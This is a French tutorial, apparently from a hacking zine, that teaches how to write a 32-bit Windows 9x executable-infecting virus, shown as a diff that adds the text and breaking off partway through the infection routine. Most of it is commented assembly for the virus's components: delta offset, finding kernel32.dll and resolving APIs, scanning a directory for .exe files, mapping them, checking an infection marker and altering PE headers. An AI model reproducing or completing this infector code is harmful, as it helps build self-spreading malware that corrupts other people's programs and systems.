@@ -1,0 +1,1571 @@
+--------------------------------------------------------------------------------
+               Infecteur d'exe 32 bits sous win 9x:                     rikenar
+--------------------------------------------------------------------------------
+
+Note: J'ai  effectué  la programmation de cette infecteur sous windows 98, il y
+fonctionne  donc  correctement.  En  revanche  Emper0r  l'a testé sur win2k, et
+apparemment l'infection faisait planter le programme, sur win nt et xp, ca doit
+etre pareil. Et je n'ai pas pu essayer de trouver l'erreur du fait que je n'ai
+que win98 :(. Donc désolé qu'il ne fonctionne pas de partout et si jamais qqun
+trouvait ce qui pouvait faire planter l'infection, je vous remercie d'avance
+si vous pouvez me mailer pour que j'effectue la modification.
+Voilà, c'est fini pour cette note. Et bonne lecture.
+
+
+
+[Sommaire]:
+
+
+  I/   Introduction
+
+
+  II/  Programmation
+          A/ Le delta offset
+          B/ Recherche de kernel32.dll en mémoire
+          C/ Scan des apis
+          D/ Recherche des fichiers
+          E/ Le mapping
+          F/ Infection
+
+
+  III/ Code source
+
+
+  IV/  Conclusion
+
+
+
+
+
+
+  I/ Introduction
+  ________________
+
+
+Salut à tous, me voici pour mon premier article pour ioc, je vais donc essayer
+de faire un truc de pas trop mauvais.
+
+Tout au long de cet article, je vais parler et essayer d'expliquer le plus
+possible comment peut fonctionner un infecteur de fichier win32. Comme je l'ai
+déjà dit, tout ce qui sera vu ici ne sera pas quelquechose qui n'a jamais été
+vu, ce tut s'adresse donc plus particulièrement à tous ceux qui sont un peu
+comme moi et qui débute dans le monde des infecteurs en général et sous windows
+plus particulièrement.
+
+Pour pouvoir comprendre tout ce qui va suivre, je vous conseille d'avoir
+quelques bases en assembleur win32 et sur le fonctionnement des apis sous
+windows, pour le reste je vais essayé de détailler le plus possible.
+Aussi comme je l'ai déjà dit dans mon premier article sur les infecteurs 16
+bits, si vous lisez ce tut dans l'espoir de planter les ordis de qqun, vous
+pouvez vite vous barrer et allez rejoindre tous ceux qui ne lisent pas ces
+lignes dans l'unique but d'apprendre.
+Fini de parler, on va passer à la programmation de notre bébé :).
+
+
+
+
+  II/ Programmation
+  ________________
+
+
+On peut dire que la programmation de virii win32 est complètement différente
+de celle de virii 16 bits, malgrè tout si vous avez bien compris ce dernier, je
+pense que ce que nous allons faire ne vous posera pas de difficulté.
+
+Je vais en premier expliquer le principe général de la programmation d'un virus
+sous windows.
+Car ici, il n'y a plus d'interruptions pour nous aider, on va uniquement
+utiliser les apis windows.
+
+Le première chose que nous allons faire est d'essayer de chopper l'adresse en
+mémoire de toutes les apis qui vont nous intéresser, ce qui rendra notre
+infecteur un maximum portable d'une machine à une autre, on aurait pu importer
+toutes les apis nécessaires mais alors ce serait poser un petit problème.
+En effet, quant on importe les apis pour un programme, par exemple l'api
+MessageBoxA, quant on fera un petit call MessageBoxA, voilà ce qui se passera :
+- l'api étant importé, le programme va aller effectuer un call à l'adresse de
+l'Import Table du programme où est stocké l'adresse de notre api.
+- Ensuite, le programme effectue un simple jmp Addr_MessageBoxA
+Comme vous pouvez le voir, on a pas un call Addr_MessageBoxA directement.
+Il est là le problème, si le programme que l'on veut infecter n'importe pas
+l'api que l'on veut utiliser dans notre code, beh on va avoir droit à un jolie
+plantage. La solution consiste donc à cherche l'adresse brute en mémoire de
+toutes les apis, au moins, après, on aura plus de problème.
+
+Ensuite dès que on aura toutes les adresses de nos apis, on aura plus qu'à
+modifier certains champs de l'header du fichier et pour terminer on écrira le
+code de notre virus à la fin du fichier à infecter.
+Et voilà, après tout ça, on pourra dire que notre code aura bien réaliser ce
+que l'on voulait.
+On va donc passer tout de suite à ce qui nous intéresse, c'est à dire à la
+recherche de la dll kernel32 et donc de nos apis.
+Avant toute chose, je vais expliquer 2 termes qui vont être utilisé tout au long
+ de l'article :
+
+
+
+- Adresse virtuelle : C'est l'adresse par exemple d'une api mais en mémoire,
+  par exemple, chez moi l'adresse virtuel de l'api GetProcAdress est bff76dac.
+
+- Adresse virtuelle relative : Là c'est différent, l'adresse virtuel relative
+  est le décalage de quelquechose par rapport à une autre chose. Cette façon
+  de faire simplifie pas mal de chose et permet de ne pas se soucier de la
+  localisation de notre fichier. Par avoir l'adresse virtuelle, il suffira
+  d'ajouter l'adresse de base de notre fichier à l'adresse relative.
+
+Par exemple, chez moi l'adresse de base de kernel32.dll est bff70000, et
+l'adresse relative de l'api GetProcAdress est 06dac, on peut ainsi avoir
+l'adresse virtuelle de l'api GetProcAdress en faisant simplement :
+
+Adresse de base + Adresse virtuel relative = Adresse virtuel .
+  bff7000  +  6dac  == bff76dac
+
+
+
+
+
+          A/ Le delta offset
+          __________________
+
+
+Si vous avez dèjà vu la programmation de virus, cela va vous paraitre familier
+et vous pouvez sautez cette partie.
+Sinon pour les autres je vais expliqué ce que c'est.
+
+Notre infecteur va se copier à la fin d'un fichier, étant donné que l'on
+enregistre toutes nos données dans la section .code à une adresse précise,
+lorsque l'on va vouloir y avoir accés dans le fichier infecté, toutes ce que on
+a enregistrer le sera à une adresse décalé.
+
+Il va donc falloir que l'on détermine ce décalage précisemment pour que notre
+code puisse fonctionner, si on ne le fait pas, tous va être décalé et la
+programme va planter.
+
+Voici un petit shéma qui devrait bien vous aider :
+
+
+
+                                 FICHIER APRES INFECTION :
+
+                                   +--------------------+
+                                   |                    |
+                                   |                    |
+                                   |       Code         |
+                                   |     d'origine      | -->>  Décalage
+                                   |                    |
+                                   |                    |
+                                   +--------------------+
+                                   |                    |
+                                   |      Code de       |
+                                   |    l'infecteur     |
+                                   +--------------------+
+
+-------------------------------
+call delta                         ; call delta -> push l'adresse de retour.
+
+delta:
+pop ebp                            ; on pop, on a donc ebp = adresse de delta.
+sub ebp, offset delta              ; on soustrait à ebp l'adresse du call delta
+                                   ; d'origine.
+                                   ; ebp -> décalage.
+-------------------------------
+
+
+
+
+Lorsque l'on exécute le fichier d'origine, le décalage est logiquement de 0.
+On aura donc accès au call de cette façon :
+
+
+call [ebp+fonction], au lieu de normalement call [fonction].
+
+
+
+
+
+           B/ Recherche de kernel32.dll en mémoire
+           _______________________________________
+
+
+Alors pourquoi va-t-on chercher cet dll en mémoire et pas une autre? Beh tout
+simplement parce que cette dll exporte une api qui va bien nous aider:
+GetProcAdress, en effet après l'avoir trouvé, on pourra chercher l'adresse de
+n'importe quelles apis que on lui aura passer en argument.
+
+Tout sera donc beaucoup plus simplifié. La première étape va donc être de
+trouver l'adresse de kernel32.dll. Si vous codez un petit programme en
+assembleur et que vous placez un ret sans qu'il y est eu de call préalablement,
+vous constaterez que cela termine l'execution du programme, cela implique donc
+qu'il y est avant un call. Et quel est donc ce call, c'est celui de l'api
+CreateProcessA, et on a de la chance car cet api est exporté par kernel32.dll.
+
+Aussi, il faut savoir que lorsque un call est exécuté, celui ci place sur la
+pile la valeur de retour.
+
+Donc en faisant un:
+
+mov eax, [esp]
+
+On va avoir dans eax une valeur qui sera voisine de celle du début de
+kernel32.dll, on ne devra plus qu'ensuite chercher le début de cette dll.
+
+On sait aussi que la structure de l'header d'une dll est très voisine de celle
+d'un exe, ce qui veut donc dire que le début de notre dll
+en mémoire sera caractérisé par un 'MZ', on va donc incrémenter l'adresse
+jusqu'à tomber sur cette chaine de caractères, ce qui nous indiquera bien que
+l'on se trouvera dans le dll que l'on recherche.
+Je vais vite faire un petit rappel sur les and:
+
+
+
+
+And |  0  |  1  |
+-----------------
+ 0  |  0  |  0  |
+-----------------
+ 1  |  0  |  1  |
+
+Donc un and avec au moins l'une des 2 opérandes à 0 donnera toujours 0.
+Un and avec comme opérande 0ffff0000h mettra donc à 0 les 4 derniers chiffres
+(ceux qui sont à droites).
+
+Or on sait que kernel32.dll est toujours aligné sur 64k, le fait de faire un
+and 0ffff0000h nous permettra donc de récupérer un multiple de 64kilo.
+
+
+
+-------------------------------
+mov eax, [esp]                 ; on récupère une adresse voisine de kernel32.dll
+call delta
+
+delta:                          ; on calcule le delta offset
+pop ebp
+sub ebp, offset delta
+and eax, 0ffff0000h             ; eax devient un multiple de 64k
+inc eax                         ; eax = eax + 1
+
+loop:
+dec eax                         ; on décremente
+cmp word ptr [eax],'ZM'         ; on compare avec le début la dll
+jnz loop                        ; si différent, on recommence la boucle
+mov ecx, eax                    ; sinon, on mets dans ecx l'adresse de
+                                ; kernel32.dll
+-------------------------------
+
+
+
+On a donc maintenant eax et ecx qui pointent sur le MZ header, maintenant il va
+falloir trouver l'adresse en mémoire du PE header.
+
+Je vais expliquer le minimum pour que vous compreniez, c'est pour ça que je vous
+conseille d'aller un peu chercher des infos, j'ai vu quelquechose de pasmal sur
+le dernier rtc disponible sur madchat, sinon vous pouvez vous aider de la doc de
+Christal sur le Pe header.
+
+Pour nous, le MZ header ce n'est pas très important, c'est pour cela que l'on va
+Chercher l'adresse du PE header. Et comme on a bien de la chance, à l'offset du
+MZ header + 3ch se trouve justement le déplacement relatif qu'il y a de ce
+dernier jusqu'à ce que l'on cherche, c'est à dire le PE header.
+
+
+-------------------------------
+
+mov ecx, [ecx + 3ch]          ; on mets dans ecx, le déplacement relatif
+                              ; pour aller au Pe header.
+add ecx, eax                  ; Puis on ajoute l'adresse de base de kernel32.
+cmp word ptr [ecx], 'EP'      ; On vérifie qu'on est au bon endroit.
+jnz loop                      ; sinon on recommence
+mov [ebp+APe],ecx             ; Ape =  adresse du Pe header de kernel32.dll
+mov [ebp+Akernel],eax         ; Akernel = adresse de kernel32.dll
+
+-------------------------------
+
+Voilà, on a donc bien maintenant trouvé l'adresse en mémoire de kernel32.dll et
+de son PE header, désormais on peut passer à la recherche de l'api GetProcAdress
+et des autres.
+
+
+
+
+
+           C/ Scan des apis:
+           _________________
+
+
+Le scan des apis consiste à aller chercher l'adresse en mémoire de toutes les
+apis qui vont nous être utile pour le fonctionnement de notre virus.
+
+Dans l'header de kernel32.dll, à l'offset du Pe header + 78h se trouve l'adresse
+de l'export table où sont stocké des informations sur toutes les dll qui sont
+exportés.
+
+
+
+-------------------------------
+
+mov edx, ecx                  ; edx contient désormais le Pe header
+mov edx, [edx + 78h]          ; On choppe l'adresse relative de l'Export Table
+add edx, eax                  ; et on ajoute l'adresse de kernel32.dll
+
+-------------------------------
+
+
+
+
+Maintenant, edx pointe donc sur l' Export Table, et justement cette Export Table
+contient des informations intéressantes qui sont:
+
+
+- la table des adresses des fonctions exportés qui contient les adresses
+  relatives de ces fonctions.
+- la table des adresses des noms des fonctions exportés.
+- la table des ordinals qui contient la position de l' adresse de la fonction
+  que l'on recherche dans la table des adresses.
+
+
+
+On va donc sauvegarder tout ça pour pouvoir les utilisés ensuite.
+
+
+
+-------------------------------
+
+mov ebx, [edx + 1ch]
+add ebx, eax
+mov [ebp+Afonction], ebx              ; On sauve la table des adresses.
+mov ebx, [edx + 20h]
+add ebx, eax
+mov [ebp+Namefunc], ebx               ; puis la table des noms
+mov ebx, [edx + 24h]
+add ebx, eax
+mov [ebp+Aordinal], ebx               ; et la table des ordinals.
+
+-------------------------------
+
+
+
+Pour pouvoir chopper l'adresse de l'api GetProcAdress, il va falloir que l'on
+parcoure la table des noms à la recherche de la chaine de caractère
+"GetProcAdress".
+
+En effet dans cette table est contenue le nom de toutes les apis exportés par
+la dll.
+Et à partir du moment où l'on connait la position de cette chaine de caractère
+dans la table des noms, on va pouvoir déterminer l'adresse de la fonction
+exportée.
+
+
+
+Voici un petit shéma qui résume ce qui se passe chez moi:
+
+
+Position  Table des noms    Table des ordinals      Table des adresses     Index
+          (Dword)                (Word)                    (Dword)
+
+1         AddAtomA                 ..                       ...               1
+2         AddAtomW                 ..                       ...               ..
+3         AllocConsole             ..                       ...               ..
+..        .....                    ..             +--- 00006dac <<-- 688 = 12a*4
+..        .....                    ..             |         ...               ..
+12A       GetProcAdress    ---->  1A2h    --------+         ...               ..
+..        .....                    ..                       ...               ..
+
+
+
+
+Voici l'algo our trouver l'ordinal qui correspond:
+(Position * 2) + Adresse de la table des ordinals = Ordinals.
+
+
+Pour mon exemple ca donne:
+
+( 12Ah * 2 ) + bffc1b00 = bffc1d54.
+
+On sait donc que à l'adresse bffc1d54 pointe désormais l'ordinal que nous
+cherchions, chez moi ca donne ordinal = 01A2h.
+
+Un ordinal est un Word ( 2 bytes), ce qui explique que l'on doive multilplier
+la Position par 2 et que l'ordinal trouvé soit aussi un word.
+
+
+Maintenant, il nous reste à trouver l'adresse par l'algo suivant:
+
+(Ordinal * 4) + Adresse de la table des adresses  = Adresse relative de
+GetProcAddress.
+
+
+La table des adresses des fonctions exportés nous donnera l'adresse sous forme
+de Dword ( 4 bytes) donc il faut multiplier par 4.
+
+
+Ce qui donne:
+( 1a2h * 4 ) + bffc01d8 = bffc0860.
+Donc à l'adresse bffc0860 pointe donc l'adresse relative de l' api
+GetProcAdress, ce qui donne 00006dac, pour avoir l'adresse réelle, il nous
+suffit d'ajouter l'adresse de base de kernel32.dll, ce qui fait:
+00006dac + bff70000 = bff76dac.
+
+Voilà, on a donc réussi à avoir l'adresse de l'api GetProcAdress, vous verrez
+ca va pas mal nous aider pour la suite.
+
+-------------------------------
+
+mov edx, eax                   ; on mets dans edx l'adresse de base de
+                               ; kernel32.dll.
+mov esi,[ebp+Namefunc]         ; esi pointe sur la table des noms.
+xor ecx, ecx                   ; ecx = 0.
+
+go:
+lodsd                          ; charge le contenu de eax avec ce qui se trouve
+                               ; en esi.
+add eax,edx                    ; on ajoute l'adresse de base de la dll.
+mov edi,eax                    ; edx <-> eax, edi pointe maintenant sur la
+                               ; table des noms
+push esi
+lea esi,[ebp+NGetProcAdress]   ; esi pointe sur la chaine "GetProcAddress"
+
+comp:
+cmpsb                         ; on compare esi et edi et on les incrémente.
+jne next                      ; si différent on recommence
+cmp byte ptr [edi], 0         ; sinon teste si on est à la fin de la chaine.
+je good                       ; c'est bon, on l'a.
+jmp comp                      ; non on teste le prochain caractère.
+
+next:
+pop esi                       ; esi pointe sur la table des noms.
+inc ecx                       ; ecx = ecx + 1.
+jmp go                        ; on y retourne.
+
+
+good:                         ; now ecx = la position de la chaine
+                              ; "GetProcAdress" dans la table des noms.
+shl ecx, 1                    ; ecx = ecx * 2.
+add ecx, [ebp+Aordinal]       ; on ajoute l'adresse de la table des ordinals.
+xor eax, eax                  ; eax = 0.
+mov ax, word ptr [ecx]        ; on mets l'ordinal qui est pointé par ecx dans
+                              ; ax (Word).
+shl eax, 2                    ; eax = eax * 4.
+add eax, [ebp+Afonction]      ; on ajoute l'adresse de la table des adresses
+                              ; des fctions.
+mov ebx, [eax]                ; edx = adresse virtuel de GetProcAdress.
+add ebx, edx                  ; on ajoute l'adresse de kernel32.dll.
+mov [ebp+AGetProcAdress], ebx ; ca y est, on a l'adresse réel de GetProcAdress.
+
+-------------------------------
+
+
+
+
+Bon maintenant, il ne nous reste plus qu'à rechercher toutes les autres apis
+qui vont nous servir à partir de GetProcAdress qui a pour syntaxe pour
+fonctionner:
+
+
+
+GetProcAdress(
+   HMODULE hmodule, // handle to DLL module
+   LPCSTR lpProcName // name of function
+              );
+
+
+
+En fait, hmodule va contenir l'adresse de la dll dans laquelle l' api est
+exporté et lpProcName va contenir le nom de la fonction que l'on recherche.
+En assembleur, ca donne ça
+
+
+
+lea esi, [ebp+Apis1]
+push esi                      ; nom de la fonction recherché GetModuleHandleA.
+push [ebp+Akernel]            ; adresse de kernel32.dll
+call [ebp+AGetProcAdress]     ; call GetProcAdress
+
+Apis1 db "GetModuleHandleA",0
+
+
+
+
+Et on aura en retour de la fonction dans eax, l'adresse de l' api recherchée.
+Bon je vous donne direct le code et je le commente:
+
+
+-------------------------------
+
+lea edi, [ebp+AGetModuleHandle]           ; edi pointe sur l'endroit où l'on va stocker l'
+lea esi, [ebp+NGetModuleHandle]           ; adresse de la 1ere api à chercher et esi pointe sur
+                                          ; le nom de la 1ere api à chercher.
+search:
+push esi                                  ; on push le nom de l' api à chercher
+push [ebp+Akernel]                        ; on push l'adresse de kernel32.dll
+call [ebp+AGetProcAdress]
+mov [edi], eax                            ; charge le contenu de eax dans ce qui est pointé par
+add edi, 4                                ; edi, on sauve donc l'adresse de l'api que l'on
+                                          ; cherche et on ajoute 4 à edi pour pouvoir sauvegar-
+                                          ; der la prochaine adresse  à calculé.
+
+next_api:
+inc esi                                   ; on incrémente esi
+cmp byte ptr [esi], 0                     ; on regarde si on est à la fin de la chaine.
+jne next_api                              ; si non, on reteste
+inc esi                                   ; si oui, on incrémente esi
+cmp byte ptr [esi], 0cch                  ; on  regarde si on est arrivé à la fin des fonctions
+jne search                                ; à recherché. Si non on recommence.
+
+NGetProcAdress db "GetProcAddress",0
+NGetModuleHandle db "GetModuleHandleA",0
+NExitProcess db "ExitProcess",0
+NFindFirstFile db 'FindFirstFileA',0
+NFindNextFile db 'FindNextFileA',0
+NCreateFileA db      "CreateFileA",0
+NCreateFileMappingA db "CreateFileMappingA",0
+NMapViewOfFile db "MapViewOfFile",0
+NunMapViewOfFile db "UnmapViewOfFile",0
+NCloseHandle db "CloseHandle",0
+
+
+db 0cch
+
+AGetProcAdress dd 0
+AGetModuleHandle dd 0
+AExitProcess dd 0
+AFindFirstFile dd 0
+AFindNextFile dd 0
+ACreateFileA dd 0
+ACreateFileMappingA dd 0
+AMapViewOfFile dd 0
+AunMapViewOfFile dd 0
+ACloseHandle dd 0
+
+-------------------------------
+
+Tous les noms des apis qu'il y a ci-dessus, c'est ce qui va nous servir pour pouvoir faire
+fonctionner notre infecteur win32. J'expliquerai tous cela plus en détail plus loin.
+Il ne nous reste plus qu'à chopper l'adresse de user32.dll pour pouvoir justement trouver celle
+de l'api MessageBoxA, elle va nous servir un peu plus tard. Pour trouver l'adresse de n'importe
+quelle dll, il faut utilisé la fonction GetModuleHandleA qui a pour syntaxe:
+
+GetModuleHandleA(
+LPCTSTR lpModuleName   // address of module name to return handle for
+                );
+
+-------------------------------
+
+lea eax, [ebp+Nuser]                 ; eax pointe sur le nom de la dll (User32.dll)
+push eax                             ; on le push
+call [ebp+AGetModuleHandle]
+mov [ebp+Auser], eax                 ; en retour de l'api, eax = l'adresse de User32.dll
+
+lea edi, [ebp+NMessageBox]
+push edi                             ; on push le nom de l'api à chercher l'adresse
+push [ebp+Auser]                     ; on push l'adresse de la dll qui exporte l'api, ici
+call [ebp+AGetProcAdress]            ; User32.dll
+mov [ebp+AMessageBox], eax           ; et en retour, on a dans eax l'adresse de MessageBoxA.
+
+
+Nuser db "User32.dll"
+Auser dd 0
+NMessageBox db "MessageBoxA",0
+AMessageBox dd 0
+
+-------------------------------
+
+Ouf !! Ca y est, on a terminé avec le scan des apis, on va pouvoir enfin passer à la véritable
+programmation de notre virus. Vous voyez donc que l'on a besoin de pas mal d'apis pour faire
+fonctionner notre virus correctement. On va de suite enchainer directement avec la recherche
+des fichiers à infecter.
+
+
+D/ Recherche des fichiers:
+
+Ici, les apis que l'on va utiliser sont FindFirstFileA et FindNextFileA, la première va lire la
+première entrée du répertoire et la deuxième va lire les suivantes, ces 2 apis sont l'équiva-
+lent des fonctions 4eh et 4fh sous dos. Et voici comment fonctionne ces 2 fonctions:
+
+
+FindFirstFileA(
+LPCTSTR lpFileName, // pointer to name of file to search for
+LPWIN32_FIND_DATA lpFindFileData // pointer to returned information
+);
+
+Pour nous, lpFileName va pointer sur une chaine de caractère qui va nous permettre de cibler
+notre recherche de fichier dans le repertoire. Pour nous ce sera: *.exe. Je vais expliquer le
+2eme argument un peu plus en dessous.
+
+FindNextFileA(
+HANDLE hFindFile, // handle to search
+LPWIN32_FIND_DATA lpFindFileData // pointer to structure for data on found file
+);
+
+hFindFile est l'handle que la fonction FindFirstFileA nous a donné en retour de son exécution
+et le 2eme argument est un pointeur sur une structure qui va être remplie en retour et qui va
+contenir toutes les informations qui vont nous intéresser dont le nom de notre fichier à
+infecter.
+
+
+WFD label   byte
+WFD_dwFileAttributes    dd      ?             ; attribut du fichier trouvé.
+WFD_ftCreationTime      dd      ?             ; date de création du fichier.
+                        dd      ?
+WFD_ftLastAccessTime    dd      ?             ; date de dernier accès au fichier.
+                        dd      ?
+WFD_ftLastWriteTime     dd      ?             ; date de la dernière écriture sur le fichier.
+                        dd      ?
+WFD_nFileSizeHigh       dd      ?             ; donne la partie haute de la taille du fichier.
+WFD_nFileSizeLow        dd      ?             ; et la partie basse (en bytes)-> Intéressant
+WFD_dwReserved0         dd      ?
+WFD_dwReserved1         dd      ?
+WFD_szFileName          db      260 dup (?)   ; nom du fichier à infecter -> Intéressant aussi.
+WFD_szAlternateFileName db      13 dup (?)    ; nom dos du fichier.
+                        db      03 dup (?)    ; bourrage pour remplir la structure.
+
+
+
+
+-------------------------------
+
+lea esi,[ebp+WFD]                     ; on charge notre structure qui recevra les informations.
+lea eax,[ebp+exe_mask]                ; notre mask -> *.exe.
+push esi                              ; on push les arguments.
+push eax
+
+call [ebp+AFindFirstFile]             ; on cherche la 1ere entrée du répertoire.
+cmp  eax, 0ffffffffh                  ; on vérifie si il n'y a pas d'erreur, si eax = -1, une
+je   exit                             ; erreur s'est produite donc on se casse.
+mov  [ebp+FirstHandle],eax            ; sinon on sauve le handle renvoyé.
+
+re:
+
+......                                ; omis pour l'instant.
+......
+call mapping                          ; on mappe le fichier.
+call infection                        ; on l'infecte -> on verra ces 2 trucs plus tard.
+
+second:
+lea  edi,[ebp+WFD]                    ; toujours pour la structure.
+push edi
+push [ebp+FirstHandle]                ; on push le 1er handle renvoyé.
+call [ebp+AFindNextFile]              ; on cherche un autre fichier.
+test  eax, eax                        ; on test si eax = 0, ce qui voudrait dire que tous les
+jnz  re                               ; fichiers du réperoire ont été trouvé, si ce n'est pas
+                                      ; le cas, alors on mappe et on infecte.
+exe_mask  db  "*.exe",0
+
+-------------------------------
+
+Youpi, maintenant on sait quel fichier infecter, comme vous pouvez le voir, pour l'instant ce
+n'est pas extremement compliqué. Maintenant on va pouvoir passer au mapping.
+
+
+
+E/ Le mapping
+
+Voilà, on est parti pour le mapping, je peux vous dire que ça va bien nous servir et ca va bien
+nous simplifier la vie en ce qui concerne l'écriture du virus et la modification des différents
+champs du Pe header. Beh en fait le mapping consiste à mapper un fichier (ca vous devez l'avoir
+compris), ce qui va nous permettre de le modifier et ce directement en mémoire et dès que l'on
+démappera le fichier, tous les modifications que l'on aura effectué en mémoire l'auront été
+aussi sur le disque, voilà donc à quoi ca sert. Tout cela va pouvoir se faire grâce au apis :
+- CreateFileA qui va nous permettre de récupérer l'handle du fichier à mapper.
+- CreateFileMappingA qui va nous préparer le mapping de notre fichier à mapper et qui va nous
+renvoyer un handle nécessaire pour l'api ci dessous.
+- MapViewOfFile qui va crée la copie en mémoire de notre fichier et qui va nous renvoyé en
+retour l'adresse mémoire de l'image crée.
+- unMapViewOfFile qui démappe le fichier précédemment copié en mémoire.
+- CloseHandle qui va fermer le fichier que l'on voulait modifier.
+Il y a donc 5 apis intéressant pour nous, voici donc vite fait la description de ces 5 apis.
+
+HANDLE CreateFile(
+LPCTSTR lpFileName, // pointer to name of the file
+DWORD dwDesiredAccess, // access (read-write) mode
+DWORD dwShareMode, // share mode
+LPSECURITY_ATTRIBUTES lpSecurityAttributes, // pointer to security attributes
+DWORD dwCreationDisposition, // how to create
+DWORD dwFlagsAndAttributes, // file attributes
+HANDLE hTemplateFile // handle to file with attributes to copy
+);
+
+Il n'y a que 4 arguments qui vont nous être utile avec cette fonction:
+- dwCreationDisposition -> qui doit spécifier si le fichier existe ou pas, si il faut le créer
+etc... En C, on remplirai ce champs par OPEN_EXISTING qui voudrait dire que l'on veut ouvrir un
+fichier qui existe déjà, ce qui est notre cas. Si l'on regarde un peu dans dans les fichiers
+qu'inclut visual c++ pour moi, faut voir dans winbase.h, on a cette ligne :
+#define OPEN_EXISTING       3
+On en conclut donc que pour ce champs, le code se traduira par un push 3.
+- dwShareMode -> ce champs va permettre d'indiquer le partage du fichier, pour nous ce sera
+un push 1.
+- dwDesiredAccess -> spécifie le type d'accès, c'est à dire en écriture, en lecture ou les 2.
+Pour nous, ce sera les 2 ce qui fait que l'on utilisera un push 80000000h or 40000000h.
+- lpFileName ->ici rien de bien compliqué, ce champs contiendra le nom du fichier à ouvrir.
+
+Et en retour de cet api, c'est à dire en eax, on aura l'handle de notre fichier qui va nous
+servir par la suite.
+
+HANDLE CreateFileMapping(
+HANDLE hFile, // handle to file to map
+LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // optional security attributes
+DWORD flProtect, // protection for mapping object
+DWORD dwMaximumSizeHigh, // high-order 32 bits of object size
+DWORD dwMaximumSizeLow, // low-order 32 bits of object size
+LPCTSTR lpName // name of file-mapping object
+);
+
+Pour cette api, il y a 3 champs à remplir qui sont à détaillés:
+- dwMaximumSizeLow -> spécifie la taille maximum du fichier à mapper, ce champs sera renseigné
+par la structure que l'on aura rempli avec la fonction FindFirstFileA.
+- flProtect -> spécifie le mode d'accès à la zone de mémoire qu'y vient d'être créer, pour nous
+ce sera lecture et écriture, ce qui donne en asm: push 4.
+- hFile -> handle qui nous a été retourné par l'api CreateFile.
+
+Et comme toujours, on va recevoir en eax, un handle qui va être nécessaire pour la fonction qui
+va suivre.
+
+
+LPVOID MapViewOfFile(
+HANDLE hFileMappingObject, // file-mapping object to map into address space
+DWORD dwDesiredAccess, // access mode
+DWORD dwFileOffsetHigh, // high-order 32 bits of file offset
+DWORD dwFileOffsetLow, // low-order 32 bits of file offset
+DWORD dwNumberOfBytesToMap // number of bytes to map
+);
+
+Je détaille toujours les champs qui nous sont utiles:
+- dwNumberOfBytesToMap -> toujours le nombre de bytes à mapper, ce sera la taille de notre
+fichier.
+- dwDesiredAccess -> spécifie le type d'accès du fichier que l'on mappe, pour nous ce sera
+encore en écriture et en lecture ce qui va donner un push 2.
+- hFileMappingObject -> handle renvoyé par l'api CreateFileMapping.
+
+Et maintenant c'est fini, du moins pour le mapping, en retour de cet api, on va avoir en eax
+l'adresse mémoire où sera l'image qui vient d'être crée.
+Pour finir les 2 autres apis:
+
+
+BOOL UnmapViewOfFile(
+LPCVOID lpBaseAddress // address where mapped view begins
+ );
+- lpBaseAddress -> adresse qui a été renvoyé en eax par MapViewOfFile.
+
+
+BOOL CloseHandle(
+HANDLE hObject // handle to object to close
+);
+
+- hObject -> handle de l'objet à fermer.
+
+Ouf, on a fini, on va pouvoir passer au code commenté, vous remarquerez que je ne laisse que
+les lignes de code qui sont en rapport avec le mapping.
+
+
+-------------------------------
+
+re:
+
+push 00h
+push 00h
+push 03h                             ; ouverture d'un fichier déjà existant.
+push 00h
+push 01h
+push 80000000h or 40000000h          ; ouverture en lecture et en écriture.
+lea esi,[ebp+WFD_szFileName]         ; nom du fichier à ouvrir
+push esi
+call [ebp+ACreateFileA]
+mov [ebp+Fhandle], eax               ; au sauve l'handle qui nous est renvoyé.
+mov esi,[ebp+WFD_nFileSizeLow]       ; en mets dans esi, la taille du fichier à mapper.
+
+call mapping                         ; on mappe.
+call infection
+
+....
+....
+
+mapping:
+
+push 00h
+push esi                             ; taille nécessaire pour le mapping.
+push 00h
+push 04h                             ; mode d'accès en lecture et en écriture.
+push 00h
+push [ebp+Fhandle]                   ; on push l'handle renvoyé par CreateFileA.
+call [ebp+ACreateFileMappingA]
+mov  [ebp+Mhandle], eax              ; on sauve encore.
+
+push esi                             ; encore la taille à mapper.
+push 00h
+push 00h
+push 02h                             ; permet la lecture et l'écriture de l'image qui va être
+push [ebp+Mhandle]                   ; crée. On push le handle renvoyé par CreateFileMappingA.
+call [ebp+AMapViewOfFile]
+mov [ebp+AddrMap], eax               ; et on sauve l'adresse mémoire de l'image.
+ret
+
+-------------------------------
+
+
+Ca y est, on en a fini pour ce qui est du mapping et on a enfin l'adresse de l'image qui vient
+d'être crée, on a donc désormais tout pour pouvoir commencé l'infection. Je vous le dit, on
+est presque à la fin maintenant, il ne nous reste plus qu'à modifier des champs de l'header
+et à écrire notre code à la fin du fichier.
+
+
+
+F/ Infection :
+
+
+Avant d'aborder l'infection en elle même, nous allons vérifier que l'on se trouve bien dans un
+fichier exe win32 qui possède bien un Pe header, on va aussi vérifier que l'on ne va pas
+s'écrire dans un fichier qui serait déjà infecté par notre virus. Mais avant toute chose, je
+vais préciser un peu quelquechose sur la taille que nous avons donné lorsque l'on voulait
+mapper le fichier, en effet nous avons pushé en argument de la fonction MapViewOfFile, la
+taille du fichier qui nous avait été renvoyé par l'api FindFirstFile, or nous nous voulons
+écrire notre code à la fin de ce fichier ce qui implique que la taille à mapper du fichier
+soit supérieure. Pour éviter d'augmenter inutilement la taille d'un fichier qui aura déjà été
+infecter, nous allons devoir effectuer 2 fois le mapping :
+- la 1ere fois, nous allons créer l'image avec la vrai taille du fichier qui nous a été renvoyé
+, puis nous allons regarder par l'intermédiaire de la signature que l'on aura écrite si le
+fichier est déjà infecté. Si c'est le cas, on quitte et on démappe.
+- Si ce n'est pas le cas, et que le fichier est sain, on démappe puis on remappe en prenant le
+soin d'ajouter la taille de notre infecteur, ce qui nous permettra de créer l'image en mémoire
+de notre fichier avec une taille supérieur et de pouvoir placer notre code à la fin sans aucun
+problème.
+
+
+
+-------------------------------
+
+infection:
+mov esi,[eax+3Ch]                   ; esi = déplacement relatif vers le Pe header.
+add esi,eax                         ; on ajoute l'adresse de base renvoyé par MapViewOfFile.
+cmp dword ptr [esi],'EP'            ; on regarde si on est bien au Pe header
+jnz demap                           ; sinon on démap et on se casse.
+cmp dword ptr [esi+4Ch],"EKIR"      ; on regade si le fichier est déjà infecté.
+jz  demap                           ; si oui, on démappe.
+
+
+mov ecx, [esi+38h]                  ; 38h = 18h + 20h.
+mov [ebp+Alignvirtual], ecx         ; on sauve l'alignement de la section.
+mov ecx, [esi+3ch]                  ; 3ch = 18h + 24h.
+mov [ebp+Alignraw], ecx             ; on sauve l'alignement du fichier.
+
+
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]         ; on démappe.
